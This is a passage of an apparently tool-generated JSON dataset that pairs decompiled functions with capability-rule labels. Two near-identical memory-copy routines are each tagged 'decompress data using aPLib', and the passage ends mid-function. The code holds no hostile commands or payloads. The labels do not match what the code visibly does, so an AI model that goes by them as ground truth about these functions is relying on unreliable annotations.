            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nulong * fcn.004052e0(ulong *param_1, ulong *param_2, uint32_t param_3)\n\n{\n    ulong uVar1;\n    uchar auVar2 [32];\n    uchar auVar3 [32];\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    int32_t iVar16;\n    ulong *puVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    int32_t iVar20;\n    ulong *puVar21;\n    uint *puVar22;\n    uint *puVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    \n    if ((param_2 < param_1) && (param_1 < param_3 + param_2)) {\n        puVar22 = (param_3 - 4) + param_2;\n        puVar23 = (param_3 - 4) + param_1;\n        if ((puVar23 & 3) == 0) {\n            uVar19 = param_3 >> 2;\n            if (uVar19 < 8) goto code_r0x00405690;\n            for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                *puVar23 = *puVar22;\n                puVar22 = puVar22 + -1;\n                puVar23 = puVar23 + -1;\n            }\n    // switch table (4 cases) at 0x4057b4\n            switch(param_3 & 3) {\n            case 1:\n                goto code_r0x004057cc;\n            case 2:\n                goto code_r0x004057dc;\n            case 3:\n                goto code_r0x004057f0;\n            }\n        }\n        else {\n    // switch table (4 cases) at 0x4057b4\n            switch(param_3) {\n            case 0:\n                break;\n            case 1:\ncode_r0x004057cc:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                return param_1;\n            case 2:\ncode_r0x004057dc:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                *(puVar23 + 2) = *(puVar22 + 2);\n                return param_1;\n            case 3:\ncode_r0x004057f0:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                *(puVar23 + 2) = *(puVar22 + 2);\n                *(puVar23 + 1) = *(puVar22 + 1);\n                return param_1;\n            default:\n                param_3 = param_3 - (puVar23 & 3);\n                switch(puVar23 & 3) {\n                case 1:\n                    *(puVar23 + 3) = *(puVar22 + 3);\n                    puVar22 = puVar22 + -1;\n                    uVar19 = param_3 >> 2;\n                    puVar23 = puVar23 - 1;\n                    if (uVar19 < 8) {\ncode_r0x00405690:\n    // WARNING: Could not recover jumptable at 0x00405692. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x405764\n                        puVar17 = (**(uVar19 * -4 + 0x405764))();\n                        return puVar17;\n                    }\n                    for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar23 = *puVar22;\n                        puVar22 = puVar22 + -1;\n                        puVar23 = puVar23 + -1;\n                    }\n                    switch(param_3 & 3) {\n                    case 1:\n                        goto code_r0x004057cc;\n                    case 2:\n                        goto code_r0x004057dc;\n                    case 3:\n                        goto code_r0x004057f0;\n                    }\n                    break;\n                case 2:\n                    *(puVar23 + 3) = *(puVar22 + 3);\n                    uVar19 = param_3 >> 2;\n                    *(puVar23 + 2) = *(puVar22 + 2);\n                    puVar22 = puVar22 + -2;\n                    puVar23 = puVar23 - 2;\n                    if (uVar19 < 8) goto code_r0x00405690;\n                    for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar23 = *puVar22;\n                        puVar22 = puVar22 + -1;\n                        puVar23 = puVar23 + -1;\n                    }\n                    switch(param_3 & 3) {\n                    case 1:\n                        goto code_r0x004057cc;\n                    case 2:\n                        goto code_r0x004057dc;\n                    case 3:\n                        goto code_r0x004057f0;\n                    }\n                    break;\n                case 3:\n                    *(puVar23 + 3) = *(puVar22 + 3);\n                    *(puVar23 + 2) = *(puVar22 + 2);\n                    uVar19 = param_3 >> 2;\n                    *(puVar23 + 1) = *(puVar22 + 1);\n                    puVar22 = puVar22 + -3;\n                    puVar23 = puVar23 - 3;\n                    if (uVar19 < 8) goto code_r0x00405690;\n                    for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar23 = *puVar22;\n                        puVar22 = puVar22 + -1;\n                        puVar23 = puVar23 + -1;\n                    }\n                    switch(param_3 & 3) {\n                    case 1:\n                        goto code_r0x004057cc;\n                    case 2:\n                        goto code_r0x004057dc;\n                    case 3:\n                        goto code_r0x004057f0;\n                    }\n                }\n            }\n        }\n        return param_1;\n    }\n    puVar17 = param_1;\n    if ((*0x44500c >> 1 & 1) != 0) {\n        for (; param_3 != 0; param_3 = param_3 - 1) {\n            *puVar17 = *param_2;\n            param_2 = param_2 + 1;\n            puVar17 = puVar17 + 1;\n        }\n        return param_1;\n    }\n    if (param_3 < 0x80) {\ncode_r0x004054eb:\n        if ((param_1 & 3) != 0) {\ncode_r0x00405508:\n            switch(param_3) {\n            case 0:\n                return param_1;\n            case 1:\n                break;\n            case 2:\n                goto code_r0x0040563c;\n            case 3:\n                goto code_r0x00405650;\n            default:\n                uVar19 = (param_3 - 4) + (param_1 & 3);\n                switch(param_1 & 3) {\n                case 0:\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                case 1:\n                    *param_1 = *param_2;\n                    *(param_1 + 1) = *(param_2 + 1);\n                    uVar18 = uVar19 >> 2;\n                    *(param_1 + 2) = *(param_2 + 2);\n                    param_2 = param_2 + 3;\n                    puVar17 = param_1 + 3;\n                    if (7 < uVar18) {\n                        for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                            *puVar17 = *param_2;\n                            param_2 = param_2 + 4;\n                            puVar17 = puVar17 + 4;\n                        }\n                        switch(uVar19 & 3) {\n                        case 0:\n                            return param_1;\n                        case 2:\n                            goto code_r0x0040563c;\n                        case 3:\n                            goto code_r0x00405650;\n                        }\n                        break;\n                    }\n                    goto code_r0x00405528;\n                case 2:\n                    *param_1 = *param_2;\n                    uVar18 = uVar19 >> 2;\n                    *(param_1 + 1) = *(param_2 + 1);\n                    param_2 = param_2 + 2;\n                    puVar17 = param_1 + 2;\n                    if (uVar18 < 8) goto code_r0x00405528;\n                    for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                        *puVar17 = *param_2;\n                        param_2 = param_2 + 4;\n                        puVar17 = puVar17 + 4;\n                    }\n                    switch(uVar19 & 3) {\n                    case 0:\n                        return param_1;\n                    case 2:\n                        goto code_r0x0040563c;\n                    case 3:\n                        goto code_r0x00405650;\n                    }\n                    break;\n                case 3:\n                    *param_1 = *param_2;\n                    uVar18 = uVar19 >> 2;\n                    param_2 = param_2 + 1;\n                    puVar17 = param_1 + 1;\n                    if (uVar18 < 8) goto code_r0x00405528;\n                    for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                        *puVar17 = *param_2;\n                        param_2 = param_2 + 4;\n                        puVar17 = puVar17 + 4;\n                    }\n                    switch(uVar19 & 3) {\n                    case 0:\n                        return param_1;\n                    case 2:\n                        goto code_r0x0040563c;\n                    case 3:\n                        goto code_r0x00405650;\n                    }\n                }\n            }\n            goto code_r0x00405630;\n        }\n    }\n    else {\n        if ((((param_1 ^ param_2) & 0xf) == 0) && ((*0x443008 >> 1 & 1) != 0)) {\n            if ((param_2 & 0xf) != 0) {\n                uVar18 = 0x10 - (param_2 & 0xf);\n                param_3 = param_3 - uVar18;\n                for (uVar19 = uVar18 & 3; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    *puVar17 = *param_2;\n                    param_2 = param_2 + 1;\n                    puVar17 = puVar17 + 1;\n                }\n                for (uVar18 = uVar18 >> 2; uVar18 != 0; uVar18 = uVar18 - 1) {\n                    *puVar17 = *param_2;\n                    param_2 = param_2 + 4;\n                    puVar17 = puVar17 + 4;\n                }\n            }\n            for (uVar19 = param_3 >> 7; uVar19 != 0; uVar19 = uVar19 - 1) {\n                uVar24 = *(param_2 + 4);\n                uVar25 = *(param_2 + 1);\n                uVar26 = *(param_2 + 0xc);\n                uVar4 = *(param_2 + 2);\n                uVar5 = *(param_2 + 0x14);\n                uVar6 = *(param_2 + 3);\n                uVar7 = *(param_2 + 0x1c);\n                uVar8 = *(param_2 + 4);\n                uVar9 = *(param_2 + 0x24);\n                uVar10 = *(param_2 + 5);\n                uVar11 = *(param_2 + 0x2c);\n                uVar12 = *(param_2 + 6);\n                uVar13 = *(param_2 + 0x34);\n                uVar14 = *(param_2 + 7);\n                uVar15 = *(param_2 + 0x3c);\n                *puVar17 = *param_2;\n                *(puVar17 + 4) = uVar24;\n                *(puVar17 + 1) = uVar25;\n                *(puVar17 + 0xc) = uVar26;\n                *(puVar17 + 2) = uVar4;\n                *(puVar17 + 0x14) = uVar5;\n                *(puVar17 + 3) = uVar6;\n                *(puVar17 + 0x1c) = uVar7;\n                *(puVar17 + 4) = uVar8;\n                *(puVar17 + 0x24) = uVar9;\n                *(puVar17 + 5) = uVar10;\n                *(puVar17 + 0x2c) = uVar11;\n                *(puVar17 + 6) = uVar12;\n                *(puVar17 + 0x34) = uVar13;\n                *(puVar17 + 7) = uVar14;\n                *(puVar17 + 0x3c) = uVar15;\n                uVar24 = *(param_2 + 0x44);\n                uVar25 = *(param_2 + 9);\n                uVar26 = *(param_2 + 0x4c);\n                uVar4 = *(param_2 + 10);\n                uVar5 = *(param_2 + 0x54);\n                uVar6 = *(param_2 + 0xb);\n                uVar7 = *(param_2 + 0x5c);\n                uVar8 = *(param_2 + 0xc);\n                uVar9 = *(param_2 + 100);\n                uVar10 = *(param_2 + 0xd);\n                uVar11 = *(param_2 + 0x6c);\n                uVar12 = *(param_2 + 0xe);\n                uVar13 = *(param_2 + 0x74);\n                uVar14 = *(param_2 + 0xf);\n                uVar15 = *(param_2 + 0x7c);\n                *(puVar17 + 8) = *(param_2 + 8);\n                *(puVar17 + 0x44) = uVar24;\n                *(puVar17 + 9) = uVar25;\n                *(puVar17 + 0x4c) = uVar26;\n                *(puVar17 + 10) = uVar4;\n                *(puVar17 + 0x54) = uVar5;\n                *(puVar17 + 0xb) = uVar6;\n                *(puVar17 + 0x5c) = uVar7;\n                *(puVar17 + 0xc) = uVar8;\n                *(puVar17 + 100) = uVar9;\n                *(puVar17 + 0xd) = uVar10;\n                *(puVar17 + 0x6c) = uVar11;\n                *(puVar17 + 0xe) = uVar12;\n                *(puVar17 + 0x74) = uVar13;\n                *(puVar17 + 0xf) = uVar14;\n                *(puVar17 + 0x7c) = uVar15;\n                param_2 = param_2 + 0x10;\n                puVar17 = puVar17 + 0x10;\n            }\n            if ((param_3 & 0x7f) != 0) {\n                for (uVar19 = (param_3 & 0x7f) >> 4; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    uVar24 = *(param_2 + 4);\n                    uVar25 = *(param_2 + 1);\n                    uVar26 = *(param_2 + 0xc);\n                    *puVar17 = *param_2;\n                    *(puVar17 + 4) = uVar24;\n                    *(puVar17 + 1) = uVar25;\n                    *(puVar17 + 0xc) = uVar26;\n                    param_2 = param_2 + 2;\n                    puVar17 = puVar17 + 2;\n                }\n                if ((param_3 & 0xf) != 0) {\n                    for (uVar19 = (param_3 & 0xf) >> 2; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar17 = *param_2;\n                        param_2 = param_2 + 4;\n                        puVar17 = puVar17 + 4;\n                    }\n                    for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {\n                        *puVar17 = *param_2;\n                        param_2 = param_2 + 1;\n                        puVar17 = puVar17 + 1;\n                    }\n                }\n            }\n            return param_1;\n        }\n        if ((*0x44500c & 1) == 0) goto code_r0x004054eb;\n        if ((param_1 & 3) != 0) goto code_r0x00405508;\n        if ((param_2 & 3) == 0) {\n            if ((param_1 >> 2 & 1) != 0) {\n                uVar24 = *param_2;\n                param_3 = param_3 - 4;\n                param_2 = param_2 + 4;\n                *param_1 = uVar24;\n                param_1 = param_1 + 4;\n            }\n            if ((param_1 >> 3 & 1) != 0) {\n                uVar1 = *param_2;\n                param_3 = param_3 - 8;\n                param_2 = param_2 + 1;\n                *param_1 = uVar1;\n                param_1 = param_1 + 1;\n            }\n            if ((param_2 & 7) == 0) {\n                puVar17 = param_2 + -1;\n                uVar24 = *param_2;\n                uVar25 = *(param_2 + 4);\n                do {\n                    puVar21 = puVar17;\n                    uVar5 = *(puVar21 + 4);\n                    uVar6 = *(puVar21 + 0x24);\n                    param_3 = param_3 - 0x30;\n                    auVar2 = *(puVar21 + 2);\n                    uVar26 = *(puVar21 + 7);\n                    uVar4 = *(puVar21 + 0x3c);\n                    auVar3 = *(puVar21 + 4);\n                    *(param_1 + 1) = uVar24;\n                    *(param_1 + 0xc) = uVar25;\n                    *(param_1 + 2) = uVar5;\n                    *(param_1 + 0x14) = uVar6;\n                    *(param_1 + 2) = SUB3216(auVar2 >> 0x40, 0);\n                    *(param_1 + 4) = SUB3216(auVar3 >> 0x40, 0);\n                    param_1 = param_1 + 6;\n                    puVar17 = puVar21 + 6;\n                    uVar24 = uVar26;\n                    uVar25 = uVar4;\n                } while (0x2f < param_3);\n                puVar21 = puVar21 + 7;\n            }\n            else if ((param_2 >> 3 & 1) == 0) {\n                iVar16 = param_2 + -4;\n                uVar24 = *param_2;\n                uVar25 = *(param_2 + 4);\n                uVar26 = *(param_2 + 1);\n                do {\n                    iVar20 = iVar16;\n                    uVar7 = *(iVar20 + 0x20);\n                    param_3 = param_3 - 0x30;\n                    auVar2 = *(iVar20 + 0x10);\n                    uVar4 = *(iVar20 + 0x34);\n                    uVar5 = *(iVar20 + 0x38);\n                    uVar6 = *(iVar20 + 0x3c);\n                    auVar3 = *(iVar20 + 0x20);\n                    *(param_1 + 4) = uVar24;\n                    *(param_1 + 1) = uVar25;\n                    *(param_1 + 0xc) = uVar26;\n                    *(param_1 + 2) = uVar7;\n                    *(param_1 + 2) = SUB3216(auVar2 >> 0x20, 0);\n                    *(param_1 + 4) = SUB3216(auVar3 >> 0x20, 0);\n                    param_1 = param_1 + 6;\n                    iVar16 = iVar20 + 0x30;\n                    uVar24 = uVar4;\n                    uVar25 = uVar5;\n                    uVar26 = uVar6;\n                } while (0x2f < param_3);\n                puVar21 = iVar20 + 0x34;\n            }\n            else {\n                iVar16 = param_2 + -0xc;\n                uVar24 = *param_2;\n                do {\n                    iVar20 = iVar16;\n                    uVar26 = *(iVar20 + 0x20);\n                    uVar4 = *(iVar20 + 0x24);\n                    uVar5 = *(iVar20 + 0x28);\n                    param_3 = param_3 - 0x30;\n                    auVar2 = *(iVar20 + 0x10);\n                    uVar25 = *(iVar20 + 0x3c);\n                    auVar3 = *(iVar20 + 0x20);\n                    *(param_1 + 0xc) = uVar24;\n                    *(param_1 + 2) = uVar26;\n                    *(param_1 + 0x14) = uVar4;\n                    *(param_1 + 3) = uVar5;\n                    *(param_1 + 2) = SUB3216(auVar2 >> 0x60, 0);\n                    *(param_1 + 4) = SUB3216(auVar3 >> 0x60, 0);\n                    param_1 = param_1 + 6;\n                    iVar16 = iVar20 + 0x30;\n                    uVar24 = uVar25;\n                } while (0x2f < param_3);\n                puVar21 = iVar20 + 0x3c;\n            }\n            for (; 0xf < param_3; param_3 = param_3 - 0x10) {\n                uVar24 = *puVar21;\n                uVar25 = *(puVar21 + 4);\n                uVar26 = *(puVar21 + 1);\n                uVar4 = *(puVar21 + 0xc);\n                puVar21 = puVar21 + 2;\n                *param_1 = uVar24;\n                *(param_1 + 4) = uVar25;\n                *(param_1 + 1) = uVar26;\n                *(param_1 + 0xc) = uVar4;\n                param_1 = param_1 + 2;\n            }\n            if ((param_3 >> 2 & 1) != 0) {\n                uVar24 = *puVar21;\n                param_3 = param_3 - 4;\n                puVar21 = puVar21 + 4;\n                *param_1 = uVar24;\n                param_1 = param_1 + 4;\n            }\n            if ((param_3 >> 3 & 1) != 0) {\n                param_3 = param_3 - 8;\n                *param_1 = *puVar21;\n            }\n    // WARNING: Could not recover jumptable at 0x004054e9. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (4 cases) at 0x405618\n            puVar17 = (**(param_3 * 4 + 0x405618))();\n            return puVar17;\n        }\n    }\n    uVar18 = param_3 >> 2;\n    if (uVar18 < 8) {\ncode_r0x00405528:\n    // WARNING: Could not recover jumptable at 0x00405528. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (8 cases) at 0x4055ac\n        puVar17 = (**(uVar18 * 4 + 0x4055ac))();\n        return puVar17;\n    }\n    for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n        *puVar17 = *param_2;\n        param_2 = param_2 + 4;\n        puVar17 = puVar17 + 4;\n    }\n    // switch table (4 cases) at 0x405618\n    switch(param_3 & 3) {\n    case 0:\n        return param_1;\n    case 2:\ncode_r0x0040563c:\n        *puVar17 = *param_2;\n        *(puVar17 + 1) = *(param_2 + 1);\n        return param_1;\n    case 3:\ncode_r0x00405650:\n        *puVar17 = *param_2;\n        *(puVar17 + 1) = *(param_2 + 1);\n        *(puVar17 + 2) = *(param_2 + 2);\n        return param_1;\n    }\ncode_r0x00405630:\n    *puVar17 = *param_2;\n    return param_1;\n}\n",
        "token_count": 5802
    },
    "00405af0": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nulong * fcn.00405af0(ulong *param_1, ulong *param_2, uint32_t param_3)\n\n{\n    ulong uVar1;\n    uchar auVar2 [32];\n    uchar auVar3 [32];\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    int32_t iVar16;\n    ulong *puVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    int32_t iVar20;\n    ulong *puVar21;\n    uint *puVar22;\n    uint *puVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    \n    if ((param_2 < param_1) && (param_1 < param_3 + param_2)) {\n        puVar22 = (param_3 - 4) + param_2;\n        puVar23 = (param_3 - 4) + param_1;\n        if ((puVar23 & 3) == 0) {\n            uVar19 = param_3 >> 2;\n            if (uVar19 < 8) goto code_r0x00405ea0;\n            for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                *puVar23 = *puVar22;\n                puVar22 = puVar22 + -1;\n                puVar23 = puVar23 + -1;\n            }\n    // switch table (4 cases) at 0x405fc4\n            switch(param_3 & 3) {\n            case 1:\n                goto code_r0x00405fdc;\n            case 2:\n                goto code_r0x00405fec;\n            case 3:\n                goto code_r0x00406000;\n            }\n        }\n        else {\n    // switch table (4 cases) at 0x405fc4\n            switch(param_3) {\n            case 0:\n                break;\n            case 1:\ncode_r0x00405fdc:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                return param_1;\n            case 2:\ncode_r0x00405fec:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                *(puVar23 + 2) = *(puVar22 + 2);\n                return param_1;\n            case 3:\ncode_r0x00406000:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                *(puVar23 + 2) = *(puVar22 + 2);\n                *(puVar23 + 1) = *(puVar22 + 1);\n                return param_1;\n            default:\n                param_3 = param_3 - (puVar23 & 3);\n                switch(puVar23 & 3) {\n                case 1:\n                    *(puVar23 + 3) = *(puVar22 + 3);\n                    puVar22 = puVar22 + -1;\n                    uVar19 = param_3 >> 2;\n                    puVar23 = puVar23 - 1;\n                    if (uVar19 < 8) {\ncode_r0x00405ea0:\n    // WARNING: Could not recover jumptable at 0x00405ea2. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x405f74\n                        puVar17 = (**(uVar19 * -4 + 0x405f74))();\n                        return puVar17;\n                    }\n                    for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar23 = *puVar22;\n                        puVar22 = puVar22 + -1;\n                        puVar23 = puVar23 + -1;\n                    }\n                    switch(param_3 & 3) {\n                    case 1:\n                        goto code_r0x00405fdc;\n                    case 2:\n                        goto code_r0x00405fec;\n                    case 3:\n                        goto code_r0x00406000;\n                    }\n                    break;\n                case 2:\n                    *(puVar23 + 3) = *(puVar22 + 3);\n                    uVar19 = param_3 >> 2;\n                    *(puVar23 + 2) = *(puVar22 + 2);\n                    puVar22 = puVar22 + -2;\n                    puVar23 = puVar23 - 2;\n                    if (uVar19 < 8) goto code_r0x00405ea0;\n                    for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar23 = *puVar22;\n                        puVar22 = puVar22 + -1;\n                        puVar23 = puVar23 + -1;\n                    }\n                    switch(param_3 & 3) {\n                    case 1:\n                        goto code_r0x00405fdc;\n                    case 2:\n                        goto code_r0x00405fec;\n                    case 3:\n                        goto code_r0x00406000;\n                    }\n                    break;\n                case 3:\n                    *(puVar23 + 3) = *(puVar22 + 3);\n                    *(puVar23 + 2) = *(puVar22 + 2);\n                    uVar19 = param_3 >> 2;\n                    *(puVar23 + 1) = *(puVar22 + 1);\n                    puVar22 = puVar22 + -3;\n                    puVar23 = puVar23 - 3;\n                    if (uVar19 < 8) goto code_r0x00405ea0;\n                    for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar23 = *puVar22;\n                        puVar22 = puVar22 + -1;\n                        puVar23 = puVar23 + -1;\n                    }\n                    switch(param_3 & 3) {\n                    case 1:\n                        goto code_r0x00405fdc;\n                    case 2:\n                        goto code_r0x00405fec;\n                    case 3:\n                        goto code_r0x00406000;\n                    }\n                }\n            }\n        }\n        return param_1;\n    }\n    puVar17 = param_1;\n    if ((*0x44500c >> 1 & 1) != 0) {\n        for (; param_3 != 0; param_3 = param_3 - 1) {\n            *puVar17 = *param_2;\n            param_2 = param_2 + 1;\n            puVar17 = puVar17 + 1;\n        }\n        return param_1;\n    }\n    if (param_3 < 0x80) {\ncode_r0x00405cfb:\n        if ((param_1 & 3) != 0) {\ncode_r0x00405d18:\n            switch(param_3) {\n            case 0:\n                return param_1;\n            case 1:\n                break;\n            case 2:\n                goto code_r0x00405e4c;\n            case 3:\n                goto code_r0x00405e60;\n            default:\n                uVar19 = (param_3 - 4) + (param_1 & 3);\n                switch(param_1 & 3) {\n                case 0:\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                case 1:\n                    *param_1 = *param_2;\n                    *(param_1 + 1) = *(param_2 + 1);\n                    uVar18 = uVar19 >> 2;\n                    *(param_1 + 2) = *(param_2 + 2);\n                    param_2 = param_2 + 3;\n                    puVar17 = param_1 + 3;\n                    if (7 < uVar18) {\n                        for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                            *puVar17 = *param_2;\n                            param_2 = param_2 + 4;\n                            puVar17 = puVar17 + 4;\n                        }\n                        switch(uVar19 & 3) {\n                        case 0:\n                            return param_1;\n                        case 2:\n                            goto code_r0x00405e4c;\n                        case 3:\n                            goto code_r0x00405e60;\n                        }\n                        break;\n                    }\n                    goto code_r0x00405d38;\n                case 2:\n                    *param_1 = *param_2;\n                    uVar18 = uVar19 >> 2;\n                    *(param_1 + 1) = *(param_2 + 1);\n                    param_2 = param_2 + 2;\n                    puVar17 = param_1 + 2;\n                    if (uVar18 < 8) goto code_r0x00405d38;\n                    for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                        *puVar17 = *param_2;\n                        param_2 = param_2 + 4;\n                        puVar17 = puVar17 + 4;\n                    }\n                    switch(uVar19 & 3) {\n                    case 0:\n                        return param_1;\n                    case 2:\n                        goto code_r0x00405e4c;\n                    case 3:\n                        goto code_r0x00405e60;\n                    }\n                    break;\n                case 3:\n                    *param_1 = *param_2;\n                    uVar18 = uVar19 >> 2;\n                    param_2 = param_2 + 1;\n                    puVar17 = param_1 + 1;\n                    if (uVar18 < 8) goto code_r0x00405d38;\n                    for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                        *puVar17 = *param_2;\n                        param_2 = param_2 + 4;\n                        puVar17 = puVar17 + 4;\n                    }\n                    switch(uVar19 & 3) {\n                    case 0:\n                        return param_1;\n                    case 2:\n                        goto code_r0x00405e4c;\n                    case 3:\n                        goto code_r0x00405e60;\n                    }\n                }\n            }\n            goto code_r0x00405e40;\n        }\n    }\n    else {\n        if ((((param_1 ^ param_2) & 0xf) == 0) && ((*0x443008 >> 1 & 1) != 0)) {\n            if ((param_2 & 0xf) != 0) {\n                uVar18 = 0x10 - (param_2 & 0xf);\n                param_3 = param_3 - uVar18;\n                for (uVar19 = uVar18 & 3; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    *puVar17 = *param_2;\n                    param_2 = param_2 + 1;\n                    puVar17 = puVar17 + 1;\n                }\n                for (uVar18 = uVar18 >> 2; uVar18 != 0; uVar18 = uVar18 - 1) {\n                    *puVar17 = *param_2;\n                    param_2 = param_2 + 4;\n                    puVar17 = puVar17 + 4;\n                }\n            }\n            for (uVar19 = param_3 >> 7; uVar19 != 0; uVar19 = uVar19 - 1) {\n                uVar24 = *(param_2 + 4);\n                uVar25 = *(param_2 + 1);\n                uVar26 = *(param_2 + 0xc);\n                uVar4 = *(param_2 + 2);\n                uVar5 = *(param_2 + 0x14);\n                uVar6 = *(param_2 + 3);\n                uVar7 = *(param_2 + 0x1c);\n                uVar8 = *(param_2 + 4);\n                uVar9 = *(param_2 + 0x24);\n                uVar10 = *(param_2 + 5);\n                uVar11 = *(param_2 + 0x2c);\n                uVar12 = *(param_2 + 6);\n                uVar13 = *(param_2 + 0x34);\n                uVar14 = *(param_2 + 7);\n                uVar15 = *(param_2 + 0x3c);\n                *puVar17 = *param_2;\n                *(puVar17 + 4) = uVar24;\n                *(puVar17 + 1) = uVar25;\n                *(puVar17 + 0xc) = uVar26;\n                *(puVar17 + 2) = uVar4;\n                *(puVar17 + 0x14) = uVar5;\n                *(puVar17 + 3) = uVar6;\n                *(puVar17 + 0x1c) = uVar7;\n                *(puVar17 + 4) = uVar8;\n                *(puVar17 + 0x24) = uVar9;\n                *(puVar17 + 5) = uVar10;\n                *(puVar17 + 0x2c) = uVar11;\n                *(puVar17 + 6) = uVar12;\n                *(puVar17 + 0x34) = uVar13;\n                *(puVar17 + 7) = uVar14;\n                *(puVar17 + 0x3c) = uVar15;\n                uVar24 = *(param_2 + 0x44);\n                uVar25 = *(param_2 + 9);\n                uVar26 = *(param_2 + 0x4c);\n                uVar4 = *(param_2 + 10);\n                uVar5 = *(param_2 + 0x54);\n                uVar6 = *(param_2 + 0xb);\n                uVar7 = *(param_2 + 0x5c);\n                uVar8 = *(param_2 + 0xc);\n                uVar9 = *(param_2 + 100);\n                uVar10 = *(param_2 + 0xd);\n                uVar11 = *(param_2 + 0x6c);\n                uVar12 = *(param_2 + 0xe);\n                uVar13 = *(param_2 + 0x74);\n                uVar14 = *(param_2 + 0xf);\n                uVar15 = *(param_2 + 0x7c);\n                *(puVar17 + 8) = *(param_2 + 8);\n                *(puVar17 + 0x44) = uVar24;\n                *(puVar17 + 9) = uVar25;\n                *(puVar17 + 0x4c) = uVar26;\n                *(puVar17 + 10) = uVar4;\n                *(puVar17 + 0x54) = uVar5;\n                *(puVar17 + 0xb) = uVar6;\n                *(puVar17 + 0x5c) = uVar7;\n                *(puVar17 + 0xc) = uVar8;\n                *(puVar17 + 100) = uVar9;\n                *(puVar17 + 0xd) = uVar10;\n                *(puVar17 + 0x6c) = uVar11;\n                *(puVar17 + 0xe) = uVar12;\n                *(puVar17 + 0x74) = uVar13;\n                *(puVar17 + 0xf) = uVar14;\n                *(puVar17 + 0x7c) = uVar15;\n                param_2 = param_2 + 0x10;\n                puVar17 = puVar17 + 0x10;\n            }\n            if ((param_3 & 0x7f) != 0) {\n                for (uVar19 = (param_3 & 0x7f) >> 4; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    uVar24 = *(param_2 + 4);\n                    uVar25 = *(param_2 + 1);\n                    uVar26 = *(param_2 + 0xc);\n                    *puVar17 = *param_2;\n                    *(puVar17 + 4) = uVar24;\n                    *(puVar17 + 1) = uVar25;\n                    *(puVar17 + 0xc) = uVar26;\n                    param_2 = param_2 + 2;\n                    puVar17 = puVar17 + 2;\n                }\n                if ((param_3 & 0xf) != 0) {\n                    for (uVar19 = (param_3 & 0xf) >> 2; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar17 = *param_2;\n                        param_2 = param_2 + 4;\n                        puVar17 = puVar17 + 4;\n                    }\n                    for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {\n                        *puVar17 = *param_2;\n                        param_2 = param_2 + 1;\n                        puVar17 = puVar17 + 1;\n                    }\n                }\n            }\n            return param_1;\n        }\n        if ((*0x44500c & 1) == 0) goto code_r0x00405cfb;\n        if ((param_1 & 3) != 0) goto code_r0x00405d18;\n        if ((param_2 & 3) == 0) {\n            if ((param_1 >> 2 & 1) != 0) {\n                uVar24 = *param_2;\n                param_3 = param_3 - 4;\n                param_2 = param_2 + 4;\n                *param_1 = uVar24;\n                param_1 = param_1 + 4;\n            }\n            if ((param_1 >> 3 & 1) != 0) {\n                uVar1 = *param_2;\n                param_3 = param_3 - 8;\n                param_2 = param_2 + 1;\n                *param_1 = uVar1;\n                param_1 = param_1 + 1;\n            }\n            if ((param_2 & 7) == 0) {\n                puVar17 = param_2 + -1;\n                uVar24 = *param_2;\n                uVar25 = *(param_2 + 4);\n                do {\n                    puVar21 = puVar17;\n                    uVar5 = *(puVar21 + 4);\n                    uVar6 = *(puVar21 + 0x24);\n                    param_3 = param_3 - 0x30;\n                    auVar2 = *(puVar21 + 2);\n                    uVar26 = *(puVar21 + 7);\n                    uVar4 = *(puVar21 + 0x3c);\n                    auVar3 = *(puVar21 + 4);\n                    *(param_1 + 1) = uVar24;\n                    *(param_1 + 0xc) = uVar25;\n                    *(param_1 + 2) = uVar5;\n                    *(param_1 + 0x14) = uVar6;\n                    *(param_1 